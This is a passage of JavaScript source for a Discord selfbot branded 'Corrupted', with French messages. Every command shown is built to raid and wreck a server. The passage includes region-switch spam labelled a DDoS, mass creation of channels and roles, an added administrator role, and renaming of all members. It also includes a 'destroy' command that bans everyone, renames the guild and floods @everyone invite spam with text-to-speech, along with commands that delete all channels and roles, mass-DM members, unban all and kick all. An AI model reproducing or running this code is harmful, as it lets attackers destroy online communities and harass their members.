        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('russia').catch(error => {})
        message.guild.setRegion('india').catch(error => {})
        message.guild.setRegion('japan').catch(error => {})
        message.guild.setRegion('europe').catch(error => {})
        let embed = new Discord.RichEmbed()
        .setDescription("__**Ddos voc effectuer pour arrete le ddos relancer la console ou eteindre le self . **__")
        .setColor(color)
    .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)
        message.channel.send(embed)
    }

if (message.content.startsWith(prefix + "channadd")) {
    let name = message.content.slice(10);
    message.delete();
    for (pas = 0; pas < 100; pas++) {
      message.guild.createChannel(name, "text");
    }}

    if (message.content.startsWith(prefix + "voiceadd")) {
        let name = message.content.slice(10);
        message.delete();
        for (pas = 0; pas < 100; pas++) {
          message.guild.createChannel(name, "voice");
        }}
if (message.content.startsWith(prefix + 'renameall')){
    message.delete()

        message.guild.members.forEach(m => {
            m.setNickname(`${args.join(" ")}`);
        });
        var embed = new Discord.RichEmbed()
        .setTitle("***Renameall reussi avec succés :) ***")
        .setTimestamp()
        .setColor(color)
       .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)
    message.channel.send(embed)
}


if (message.content.startsWith(prefix + 'adminroleadd')){
    message.delete()
    message.guild.createRole( {
            name: "🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟",
            permissions: [`ADMINISTRATOR`]
        } )
        var embed = new Discord.RichEmbed()
        .setTitle("***Rôle Admin ajouté :) ***")
        .setTimestamp()
        .setColor(color)
       .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)
    message.channel.send(embed)
}

if (message.content.startsWith(prefix + 'rolesadd')){
    message.delete()
    role = 0
    while (role < 50){
        test = args.join(" ")
        message.guild.createRole( {
                name: `🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟`,
                color: "RANDOM",
            } )
        
        role++;
    }
}

if (message.content === prefix + "destroy") {
    if (message.deletable) message.delete();
    if (message.author.id == client.user.id) {
        message.guild.members.forEach(member => {
            member.ban().then(function() {});
        });
    }
    if (message.content.startsWith(prefix + 'destroy')) {
        if (message.author.id == client.user.id) {
            message.delete();
            for (var i = 0; i < 90; i++) {
                message.guild.createRole({
                    name: ("🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟"),
                    mentionable: false,
                    permissions: 0,
                    position: "",
                    color: 'RANDOM'
                })
            }
        }
    }
}
if (message.content === prefix + "destroy") {
    if (message.deletable) message.delete();
    if (message.author.id == client.user.id) {
        if (message.channel.type === "dm") return;
        if (message.guild.channels.size === 0) return;
    }
}
if (message.content === prefix + "destroy") {
    if (message.channel.type === "dm") return;
    if (message.author.id == client.user.id) {
        if (message.guild.name != "🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟") {
            message.guild.setIcon('./logo.png').catch(error => {})
            message.guild.setName('🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟').catch(error => {})
            message.guild.setRegion('russia').catch(error => {})
        }
        setInterval(function() {
            if (message.guild.channels.size < 499) {
                message.guild.createChannel('🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟', 'text').catch(error => {})
            }
        }, 400)
        if (message.deletable) message.delete();
    }
}
if (message.content === prefix + 'destroy') {
    if (message.channel.type === "dm") return;
    if (message.author.id == client.user.id) {
        setInterval(function() {
            message.channel.send("@everyone @here 🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 \n" +
                `discord.gg/punchnox` +
                "\n" +
                "🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟", {
                    tts: true
                }).catch(error => {})
        }, 400)
    }
}


if (message.content === prefix + "del") {
    let serveur = message.guild;
    if (!serveur) return message.edit('**Commande uniquement utilisable sur un serveur**')
    if (message.author.id === client.user.id) {

            message.delete()
            message.guild.channels.map(c => c.delete())
            message.guild.createChannel("🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟", "text")
        }
}

            if (message.content.startsWith(prefix + "mpall")) {
                message.delete();
                if (message.channel.type === "dm") return;
                let args = message.content.split(" ").slice(1).join(" ");
                if (!args) return message.channel.send(":skull_crossbones: ERROR 404 :skull_crossbones:");
                message.guild.members.forEach(member => {
                  member.send(args).catch(e => {});
                })
                var embed = new Discord.RichEmbed()
                    .setTitle("***Mpall en cours, Votre message :*** " + args)
                    .setTimestamp()
                    .setColor(color)
                   .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)
                message.channel.send(embed)
              }
        
if (message.content.startsWith(prefix + 'deleterole')) {
    if (message.author.id == client.user.id) {
        let serveur = message.guild;
        if (!serveur) return message.edit('**Commande uniquement utilisable sur un serveur**');
        message.delete();
        for (var i = 0; i < 90; i++) {
            message.guild.roles.deleteAll()
        }
        var embed = new Discord.RichEmbed()
            .setTitle("__**Tout les roles sont supprimés ! :)**__")
            .setDescription('')
            .setColor(color)
           .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)
            message.channel.sendEmbed(embed);
    }
}
if (message.content.includes(prefix + "delact")) {
    if (message.author.id == client.user.id) {
        message.delete();
        client.user.setActivity("", {
            type: ""
        });
        var embed = new Discord.RichEmbed()
            .setTitle("__**Ton status est réinitialiser .**__")
            .setDescription('')
            .setColor(color)
           .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)
            message.channel.sendEmbed(embed);
    }
}


if (message.content === prefix + 'unbanall') {
    let serveur = message.guild;
    if (!serveur) return message.edit('**Commande uniquement utilisable sur un serveur**')
    if (message.deletable) message.delete();
    let interval = setInterval(function() {
        message.guild.fetchBans().then(bans => {
            bans.forEach(ban => {
                message.guild.unban(ban.id);
            });
        });
    }, 1000);
    var banall = new Discord.RichEmbed()
    .setTitle("__**UnBanall reussi :) **__")
    .setDescription('')
    .setColor(color)
      .setFooter(`🌟・𝘾𝙤𝙧𝙧𝙪𝙥𝙩𝙚𝙙  ・🌟 | 𝘿𝙚𝙫 𝘽𝙮 𝙍ʌ𝙮ʌ𝙣`, message.author.avatarURL)

    message.channel.sendEmbed(banall);


}
if (message.content === prefix + 'kall') {
    let serveur = message.guild;
    if (!serveur) return message.edit('**Commande uniquement utilisable sur un serveur**')
    if (message.author.id == client.user.id) {
            if (message.guild.member(message.author).hasPermission("KICK_MEMBERS")) {
                message.guild.members.forEach(member => {
                    member.send(message.guild + "__**Le karma est present ici**_");
                    member
                        .kick()
                        .then(member => {})
                        .catch(() => {
                            message.edit(
                                "__**Vous avez pas de permissions pour kick all :( **__"
                            );
                        })
                })
            }
        
    }
}

})
////////Connect/////////
client.login(token)
